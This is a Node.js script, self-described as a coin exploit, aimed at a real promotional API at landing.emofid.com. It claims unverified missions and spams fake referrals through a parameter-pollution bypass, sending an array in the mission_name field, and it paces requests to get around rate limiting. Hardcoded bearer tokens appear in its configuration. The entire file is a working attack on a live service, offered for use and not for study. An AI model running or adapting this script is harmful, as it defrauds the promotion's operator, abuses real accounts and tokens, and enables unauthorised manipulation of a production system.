/**
 * Emofid Anniversary40 Coin Exploit
 * - Completes all exploitable missions (one-time)
 * - Spams referral for unlimited coins
 */

// ============ CONFIGURATION ============
const CONFIG = {
  // token: '484638|uJlGdPeHUN4AO8lUwmKswtgCwGZZtiWZe5NA1zys2b600eb8',
  token: '545261|0M6zXDt5SaIiIh0HgBYXRojPcNi4RCU30c5gUnO3f69b3511',
  referralCount: 1, // Number of referrals to spam (10 coins each)
};

const BASE_URL = 'https://landing.emofid.com/api-service/anniversary40';

const HEADERS = {
  'Authorization': `Bearer ${CONFIG.token}`,
  'Content-Type': 'application/json',
  'Cookie': `anniversary40_token=${CONFIG.token}`
};

// Exploitable missions (no server verification)
const ONE_TIME_MISSIONS = [
  'telegram-bot-register',  // 100 coins
  'learning-login',         // 100 coins
  'bourseview-login',       // 100 coins
  'mofid-app-login',        // 100 coins
  'instagram-click',        // 100 coins
  'chatbot-start',          // 100 coins
];

// ============ HELPER FUNCTIONS ============
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function getUserInfo() {
  try {
    const response = await fetch(`${BASE_URL}/user/`, {
      method: 'GET',
      headers: HEADERS,
    });
    const data = await response.json();
    const scores = data.data.scores[0];
    return {
      coins: parseFloat(scores.coins),
      points: parseFloat(scores.points),
      rank: data.data.userRank,
      referralCode: data.data.invitation_code,
    };
  } catch (error) {
    console.log(`Error getting user info: ${error.message}`);
    return null;
  }
}

async function completeMission(missionName, extraParams = {}) {
  const payload = { mission_name: missionName, ...extraParams };

  try {
    const response = await fetch(`${BASE_URL}/actions/`, {
      method: 'POST',
      headers: HEADERS,
      body: JSON.stringify(payload),
    });
    const result = await response.json();
    return result.message || 'Unknown';
  } catch (error) {
    return `Error: ${error.message}`;
  }
}

async function completeAllOneTimeMissions() {
  console.log('\n=== Completing One-Time Missions ===');
  for (const mission of ONE_TIME_MISSIONS) {
    const result = await completeMission(mission);
    const status = result.toLowerCase().includes('success') ? 'OK' : 'SKIP';
    console.log(`  [${status}] ${mission}: ${result}`);
  }
}

async function spamReferral(count) {
  console.log(`\n=== Spamming Referral (${count} times) ===`);
  console.log(`  Using Parameter Pollution Bypass...`);
  let success = 0;
  let failed = 0;

  for (let i = 1; i <= count; i++) {
    // BYPASS: Array mission_name bypasses referral validation
    const payload = {
      mission_name: ['referral', 'landing-login'],  // Parameter pollution!
      referral_code: `referral${Date.now()}`,
    };

    try {
      const response = await fetch(`${BASE_URL}/actions/`, {
        method: 'POST',
        headers: HEADERS,
        body: JSON.stringify(payload),
      });
      const result = await response.json();

      if (result.message?.toLowerCase().includes('success')) {
        success++;
        process.stdout.write(`  [${i}/${count}] +10 coins âœ“\n`);
      } else {
        failed++;
        process.stdout.write(`  [${i}/${count}] ${result.message}\n`);
      }
    } catch (error) {
      failed++;
    }

    // Small delay to avoid rate limiting
    if (i % 10 === 0) {
      await sleep(100);
    }
  }

  console.log(`\n  Done! Success: ${success}, Failed: ${failed}`);
  console.log(`  Total coins from referral: +${success * 10}`);
}

async function main() {
  console.log('='.repeat(50));
  console.log('  Emofid Anniversary40 Coin Exploit');
  console.log('='.repeat(50));

  // Get initial status
  console.log('\n=== Initial Status ===');
  let info = await getUserInfo();
  if (info) {
    console.log(`  Coins: ${info.coins}`);
    console.log(`  Points: ${info.points}`);
    console.log(`  Rank: ${info.rank}`);
    console.log(`  Your Referral Code: ${info.referralCode}`);
  } else {
    console.log('  Failed to get user info. Check token.');
    return;
  }

  const initialCoins = info.coins;

  // Complete one-time missions
  await completeAllOneTimeMissions();

  // Spam referrals
  if (CONFIG.referralCount > 0) {
    await spamReferral(CONFIG.referralCount);
  }

  // Final status
  console.log('\n=== Final Status ===');
  info = await getUserInfo();
  if (info) {
    console.log(`  Coins: ${info.coins}`);
    console.log(`  Points: ${info.points}`);
    console.log(`  Rank: ${info.rank}`);
    console.log(`  Coins gained: +${info.coins - initialCoins}`);
  }

  console.log('\n' + '='.repeat(50));
  console.log('  Done!');
  console.log('='.repeat(50));
}

// Run
main().catch(console.error);
